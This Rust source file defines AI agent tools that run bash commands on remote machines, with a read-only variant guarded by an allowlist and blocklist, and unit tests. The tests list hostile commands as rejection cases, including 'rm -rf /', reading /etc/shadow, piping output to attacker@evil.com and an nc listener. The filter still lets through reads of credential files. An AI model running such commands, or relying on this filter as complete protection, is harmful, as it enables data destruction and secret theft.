use anyhow::Result;
use async_trait::async_trait;
use serde_json::{json, Value};
use std::sync::Arc;

use crate::llm::types::ToolDefinition;
use crate::machines::MachineRegistry;
use super::tool::Tool;

const LIST_AGENTS_PREVIEW_CHARS: usize = 500;
const RUN_COMMAND_PREVIEW_CHARS: usize = 2000;
const DEFAULT_COMMAND_TIMEOUT_SECS: u64 = 30;
const MAX_COMMAND_TIMEOUT_SECS: u64 = 300;

pub struct ListAgentsTool {
    pub registry:   Arc<MachineRegistry>,
    pub project_id: String,
}

#[async_trait]
impl Tool for ListAgentsTool {
    fn definition(&self) -> ToolDefinition {
        ToolDefinition {
            name: "list_agents".into(),
            description: "List all connected agent machines in this project. \
                          Call this before run_command to discover available agent IDs and hostnames."
                .into(),
            parameters: json!({
                "type":       "object",
                "properties": {},
                "required":   []
            }),
        }
    }

    async fn execute(&self, _params: Value) -> Result<String> {
        let agents = self.registry.agents_for_project(&self.project_id);
        Ok(serde_json::to_string_pretty(&agents)?)
    }

    fn preview(&self, result: &str) -> String {
        result.chars().take(LIST_AGENTS_PREVIEW_CHARS).collect()
    }
}

pub struct RunCommandTool {
    pub registry:   Arc<MachineRegistry>,
    pub project_id: String,
}

#[async_trait]
impl Tool for RunCommandTool {
    fn definition(&self) -> ToolDefinition {
        ToolDefinition {
            name: "run_command".into(),
            description: "Run a bash command on a connected agent machine in this project. \
                          Use list_agents first to discover agent IDs. \
                          Returns stdout, stderr, and exit code."
                .into(),
            parameters: json!({
                "type": "object",
                "properties": {
                    "agent_id": {
                        "type":        "string",
                        "description": "The agent machine ID (from list_agents)"
                    },
                    "command": {
                        "type":        "string",
                        "description": "The bash command to execute"
                    },
                    "timeout_secs": {
                        "type":        "integer",
                        "description": "Timeout in seconds (default 30, max 300)",
                        "default":     DEFAULT_COMMAND_TIMEOUT_SECS
                    }
                },
                "required": ["agent_id", "command"]
            }),
        }
    }

    async fn execute(&self, params: Value) -> Result<String> {
        let agent_id = params["agent_id"]
            .as_str()
            .ok_or_else(|| anyhow::anyhow!("agent_id is required"))?;
        let command = params["command"]
            .as_str()
            .ok_or_else(|| anyhow::anyhow!("command is required"))?;
        let timeout_secs = params["timeout_secs"]
            .as_u64()
            .unwrap_or(DEFAULT_COMMAND_TIMEOUT_SECS)
            .min(MAX_COMMAND_TIMEOUT_SECS);

        let belongs = self.registry
            .agents
            .get(agent_id)
            .map(|a| a.project_id == self.project_id)
            .unwrap_or(false);

        if !belongs {
            anyhow::bail!("agent {agent_id} not found in this project");
        }

        match self.registry.execute(agent_id, command.to_string(), timeout_secs).await {
            Ok(r) => Ok(serde_json::to_string_pretty(&json!({
                "stdout":    r.stdout,
                "stderr":    r.stderr,
                "exit_code": r.exit_code,
            }))?),
            Err(e) => anyhow::bail!("command failed: {e}"),
        }
    }

    fn preview(&self, result: &str) -> String {
        result.chars().take(RUN_COMMAND_PREVIEW_CHARS).collect()
    }
}

const READONLY_FORBIDDEN_SUBSTRINGS: &[&str] = &[
    ";", "&&", "||", "|", "`", "$(", ">", "<", "sudo",
];

const CURL_FORBIDDEN_SUBSTRINGS: &[&str] = &[
    " -d ", " -d'", " -d\"", "--data", "--upload-file", "--form", " -f ",
    "-x post", "-x put", "-x delete", "-x patch", "--request",
];

const READONLY_ALLOWED_PREFIXES: &[&str] = &[
    "cat ", "tail ", "head ", "less ", "grep ", "egrep ", "fgrep ",
    "journalctl",
    "systemctl status", "systemctl is-active", "systemctl is-enabled",
    "systemctl is-failed", "systemctl list-units", "systemctl show",
    "ps", "top -bn1", "df", "du", "free", "uptime", "ls",
    "id", "whoami", "hostname", "uname",
    "curl", "ping -c", "ss", "netstat",
    "nslookup", "dig", "host ",
    "snap list", "snap services", "snap info",
    "juju status", "juju show-unit", "juju show-application", "juju show-model", "juju debug-log",
    "lxc list", "lxc info", "lxc network list", "lxc storage list", "lxc config show",
    "docker ps", "docker logs", "docker inspect",
    "kubectl get", "kubectl describe", "kubectl logs",
];

fn is_allowed_nc(lower: &str) -> bool {
    (lower.starts_with("nc ") || lower.starts_with("ncat "))
        && lower.contains("-z")
        && !lower.contains("-l")
}

fn validate_readonly_command(command: &str) -> Result<()> {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        anyhow::bail!("command is required");
    }
    let lower = trimmed.to_lowercase();
    if READONLY_FORBIDDEN_SUBSTRINGS.iter().any(|s| lower.contains(s)) {
        anyhow::bail!(
            "command contains syntax that isn't allowed in this read-only chat \
             (no chaining, redirection, or sudo)"
        );
    }
    if lower.starts_with("curl") && CURL_FORBIDDEN_SUBSTRINGS.iter().any(|s| lower.contains(s)) {
        anyhow::bail!("curl may not use mutating flags (-d/--data, --upload-file, --form, -X/--request) in this read-only chat");
    }
    let allowed = READONLY_ALLOWED_PREFIXES.iter().any(|p| lower.starts_with(p)) || is_allowed_nc(&lower);
    if !allowed {
        anyhow::bail!("command is not on the read-only diagnostic allowlist for this chat");
    }
    Ok(())
}

pub struct RunReadOnlyCommandTool {
    pub registry:   Arc<MachineRegistry>,
    pub project_id: String,
}

#[async_trait]
impl Tool for RunReadOnlyCommandTool {
    fn definition(&self) -> ToolDefinition {
        ToolDefinition {
            name: "run_command".into(),
            description: "Run a READ-ONLY diagnostic bash command on a connected agent machine in \
                          this project — e.g. reading logs (cat/tail/journalctl), checking service \
                          or process status (systemctl status, ps), or checking connectivity (curl, \
                          nc -z, ping). Commands that install, start/stop/restart services, write \
                          files, or otherwise change state are rejected before they run. Use \
                          list_agents first to discover agent IDs. Returns stdout, stderr, and exit code."
                .into(),
            parameters: json!({
                "type": "object",
                "properties": {
                    "agent_id": {
                        "type":        "string",
                        "description": "The agent machine ID (from list_agents)"
                    },
                    "command": {
                        "type":        "string",
                        "description": "A single read-only diagnostic bash command — no chaining \
                                        (;, &&, ||, |), redirection, sudo, or mutating flags"
                    },
                    "timeout_secs": {
                        "type":        "integer",
                        "description": "Timeout in seconds (default 30, max 300)",
                        "default":     DEFAULT_COMMAND_TIMEOUT_SECS
                    }
                },
                "required": ["agent_id", "command"]
            }),
        }
    }

    async fn execute(&self, params: Value) -> Result<String> {
        let agent_id = params["agent_id"]
            .as_str()
            .ok_or_else(|| anyhow::anyhow!("agent_id is required"))?;
        let command = params["command"]
            .as_str()
            .ok_or_else(|| anyhow::anyhow!("command is required"))?;
        validate_readonly_command(command)?;
        let timeout_secs = params["timeout_secs"]
            .as_u64()
            .unwrap_or(DEFAULT_COMMAND_TIMEOUT_SECS)
            .min(MAX_COMMAND_TIMEOUT_SECS);

        let belongs = self.registry
            .agents
            .get(agent_id)
            .map(|a| a.project_id == self.project_id)
            .unwrap_or(false);

        if !belongs {
            anyhow::bail!("agent {agent_id} not found in this project");
        }

        match self.registry.execute(agent_id, command.to_string(), timeout_secs).await {
            Ok(r) => Ok(serde_json::to_string_pretty(&json!({
                "stdout":    r.stdout,
                "stderr":    r.stderr,
                "exit_code": r.exit_code,
            }))?),
            Err(e) => anyhow::bail!("command failed: {e}"),
        }
    }

    fn preview(&self, result: &str) -> String {
        result.chars().take(RUN_COMMAND_PREVIEW_CHARS).collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_registry() -> Arc<MachineRegistry> {
        MachineRegistry::new()
    }

    #[tokio::test]
    async fn list_agents_empty_project() {
        let tool = ListAgentsTool {
            registry:   make_registry(),
            project_id: "proj-1".into(),
        };
        let result = tool.execute(json!({})).await.unwrap();
        let arr: Vec<Value> = serde_json::from_str(&result).unwrap();
        assert!(arr.is_empty());
    }

    #[tokio::test]
    async fn run_command_unknown_agent_returns_error() {
        let tool = RunCommandTool {
            registry:   make_registry(),
            project_id: "proj-1".into(),
        };
        let result = tool.execute(json!({
            "agent_id": "nonexistent",
            "command":  "echo hi"
        })).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("not found"));
    }

    #[tokio::test]
    async fn run_command_cross_project_agent_rejected() {
        use crate::machines::{ConnectedAgent, ServerToAgent};
        use tokio::sync::mpsc;
        use chrono::Utc;

        let registry = make_registry();
        let (tx, _rx) = mpsc::channel::<ServerToAgent>(8);

        registry.agents.insert("agent-x".into(), ConnectedAgent {
            id:           "agent-x".into(),
            project_id:   "proj-2".into(),
            hostname:     "other-host".into(),
            connected_at: Utc::now(),
            sender:       tx,
        });

        let tool = RunCommandTool {
            registry:   Arc::clone(&registry),
            project_id: "proj-1".into(),
        };
        let result = tool.execute(json!({
            "agent_id": "agent-x",
            "command":  "echo pwned"
        })).await;
        assert!(result.is_err(), "cross-project execution must be rejected");
    }

    #[test]
    fn list_agents_definition_has_correct_name() {
        let tool = ListAgentsTool { registry: make_registry(), project_id: "p".into() };
        assert_eq!(tool.definition().name, "list_agents");
    }

    #[test]
    fn run_command_definition_has_correct_name() {
        let tool = RunCommandTool { registry: make_registry(), project_id: "p".into() };
        assert_eq!(tool.definition().name, "run_command");
    }

    #[test]
    fn validate_readonly_command_accepts_log_and_status_reads() {
        for cmd in [
            "cat /var/log/syslog",
            "tail -n 100 /var/log/juju/unit.log",
            "journalctl -u landscape-server --no-pager -n 200",
            "systemctl status landscape-server",
            "systemctl is-active postgresql",
        ] {
            assert!(validate_readonly_command(cmd).is_ok(), "expected {cmd:?} to be allowed");
        }
    }

    #[test]
    fn validate_readonly_command_accepts_connectivity_checks() {
        for cmd in ["curl -sS http://localhost:8080/health", "curl -I https://example.com", "ping -c 3 10.0.0.1", "nc -zv 10.0.0.1 5432"] {
            assert!(validate_readonly_command(cmd).is_ok(), "expected {cmd:?} to be allowed");
        }
    }

    #[test]
    fn validate_readonly_command_rejects_chaining_and_redirection() {
        for cmd in [
            "cat /etc/passwd; rm -rf /",
            "cat file && systemctl restart landscape-server",
            "systemctl status foo | mail attacker@evil.com",
            "echo hi > /etc/motd",
            "cat $(echo /etc/shadow)",
            "cat `whoami`",
            "sudo systemctl restart landscape-server",
        ] {
            assert!(validate_readonly_command(cmd).is_err(), "expected {cmd:?} to be rejected");
        }
    }

    #[test]
    fn validate_readonly_command_rejects_mutating_commands() {
        for cmd in [
            "systemctl restart landscape-server",
            "systemctl start postgresql",
            "apt install -y nginx",
            "snap install landscape-server",
            "juju deploy landscape-server",
            "terraform apply",
            "rm -rf /var/lib/postgresql",
            "lxc launch ubuntu:22.04 test",
        ] {
            assert!(validate_readonly_command(cmd).is_err(), "expected {cmd:?} to be rejected");
        }
    }

    #[test]
    fn validate_readonly_command_rejects_curl_method_overrides_and_data_flags() {
        for cmd in [
            "curl -X POST http://localhost/api",
            "curl --request DELETE http://localhost/api/1",
            "curl -d 'a=1' http://localhost/api",
            "curl --upload-file file.tf http://localhost/upload",
        ] {
            assert!(validate_readonly_command(cmd).is_err(), "expected {cmd:?} to be rejected");
        }
    }

    #[test]
    fn validate_readonly_command_rejects_nc_listen_mode() {
        assert!(validate_readonly_command("nc -l -p 4444").is_err());
    }

    #[test]
    fn validate_readonly_command_rejects_empty_command() {
        assert!(validate_readonly_command("   ").is_err());
    }

    #[tokio::test]
    async fn run_readonly_command_rejects_mutating_command_before_dispatch() {
        let tool = RunReadOnlyCommandTool { registry: make_registry(), project_id: "p".into() };
        let result = tool.execute(json!({
            "agent_id": "nonexistent",
            "command":  "systemctl restart landscape-server",
        })).await;
        let err = result.unwrap_err().to_string();
        assert!(err.contains("read-only") || err.contains("allowlist"), "unexpected error: {err}");
    }

    #[tokio::test]
    async fn run_readonly_command_unknown_agent_returns_error() {
        let tool = RunReadOnlyCommandTool { registry: make_registry(), project_id: "p".into() };
        let result = tool.execute(json!({
            "agent_id": "nonexistent",
            "command":  "systemctl status foo",
        })).await;
        assert!(result.unwrap_err().to_string().contains("not found"));
    }

    #[test]
    fn run_readonly_command_definition_has_correct_name() {
        let tool = RunReadOnlyCommandTool { registry: make_registry(), project_id: "p".into() };
        assert_eq!(tool.definition().name, "run_command");
    }
}
